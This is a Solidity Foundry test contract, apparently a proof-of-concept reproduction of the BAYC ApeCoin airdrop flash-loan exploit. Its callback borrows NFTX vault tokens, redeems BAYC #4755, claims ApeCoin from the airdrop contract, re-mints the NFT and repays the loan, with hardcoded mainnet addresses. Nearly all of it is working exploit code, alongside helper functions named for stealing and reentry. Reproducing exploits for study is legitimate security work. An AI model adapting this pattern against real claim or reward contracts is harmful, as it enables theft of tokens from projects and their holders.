// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

import "./IERC20Upgradeable.sol";
import "./IERC3156Upgradeable.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

// NFTx vault interface 
interface nftxvault {
    function flashloan(address,address,uint,bytes memory ) external ;

    function allowance (address,address) external view returns (uint) ;

    function redeem(uint256 , uint256[] calldata ) external returns (uint256[] memory);

    function mint(uint256[] calldata ,uint256[] calldata  ) external returns (uint256);
}

interface IERC721 {
    function balanceOf(address) external view returns (uint256);
    function setApprovalForAll(address,bool) external ;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function approve(address ,uint) external returns(bool);
    function ownerOf(uint) external view returns (address );
}

interface IERC20{
    function balanceOf(address) external view returns (uint);
    function approve(address,uint) external returns (bool);
    function transfer(address,uint) external returns (bool);
}

// BAYC apecoin claim contract interface
interface AirdropGrapesToken {
    function claimTokens() external ;
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}




contract FlashBorrower is IERC3156FlashBorrowerUpgradeable,DSTest {
    enum Action {NORMAL, STEAL, REENTER}

    uint256 public flashBalance;
    address public flashUser;
    address public flashToken;
    uint256 public flashValue;
    uint256 public flashFee;

    nftxvault vault;
    IERC721 bayc;

    // Helper cheatcodes initialization in foundry
    Vm vm = Vm(HEVM_ADDRESS);
    AirdropGrapesToken airdropbayccontract;
    

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(address user, address token, uint256 value, uint256 fee, bytes calldata data) external override returns (bytes32) {
        (Action action) = abi.decode(data, (Action)); // Use this to unpack arbitrary data
        flashUser = user;
        flashToken = token;
        flashValue = value;
        flashFee = fee;
        // checking the bayc flash loan value received 
        flashBalance = IERC20Upgradeable(token).balanceOf(address(this));
        console.log(flashBalance);
        uint[] memory ids = new uint[](1);

        bayc = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
        ids[0] =4755 ;
        // initializing the bayc vault address on mainnet.
        vault  = nftxvault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
        address vaultowner = bayc.ownerOf(ids[0]);
        vm.label(address(bayc),"bayc");
        assertEq(vaultowner, address(vault));

        // Redeeming the BAYC 4755 by calling redeem function in return of BAYC tokens as given by flashloan
        vault.redeem(1,ids);

        address a = bayc.ownerOf(731);
        vm.label(address(vault),"vault");
        uint baycbalance  = bayc.balanceOf(address(this));
        console.log("bayc balance ",baycbalance);


// Calling apecoin grapes contract for claiming the apecoin

        airdropbayccontract = AirdropGrapesToken(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
        airdropbayccontract.claimTokens();
        address apecoin = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
        uint apecoinbal = IERC20(apecoin).balanceOf(address(this));
        assertGt(apecoinbal,0);

// @dev Approving the NFTx vault to transfer the BAYC #4755 token back
        bayc.setApprovalForAll(msg.sender,true);
        bool check= bayc.isApprovedForAll(address(this),msg.sender);
        console.log("approved bayc or not ", check);

        uint[] memory amounts = new uint[](0);
        // Transferring the BAYC to the vault and getting BAYC tokens in return 
        vault.mint(ids,amounts);
        IERC20 bayctoken= IERC20(token);
        uint balance = bayctoken.balanceOf(address(this));
        assertGt(balance,0);
            // Do nothing
            // Approving the flash loan provider of the BAYC tokens to give it back after the claim
        IERC20Upgradeable(flashToken).approve(msg.sender, flashValue + flashFee); // Resolve the flash loan
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function flashBorrow(address lender, address token, uint256 value) public {
        // Use this to pack arbitrary data to `onFlashLoan`
        bytes memory data = abi.encode(Action.NORMAL);
        IERC3156FlashLenderUpgradeable(lender).flashLoan(IERC3156FlashBorrowerUpgradeable(address(this)), token, value, data);
    } 

    function flashBorrowAndSteal(address lender, address token, uint256 value) public {
        // Use this to pack arbitrary data to `onFlashLoan`
        bytes memory data = abi.encode(Action.STEAL);
        IERC3156FlashLenderUpgradeable(lender).flashLoan(IERC3156FlashBorrowerUpgradeable(address(this)), token, value, data);
    }

    function flashBorrowAndReenter(address lender, address token, uint256 value) public {
        // Use this to pack arbitrary data to `onFlashLoan`
        bytes memory data = abi.encode(Action.REENTER);
        IERC3156FlashLenderUpgradeable(lender).flashLoan(IERC3156FlashBorrowerUpgradeable(address(this)), token, value, data);
    }

/* @dev : To receive an ERC721 NFT, the contract must have this function or the tranfer will revert */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4){
        
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

}
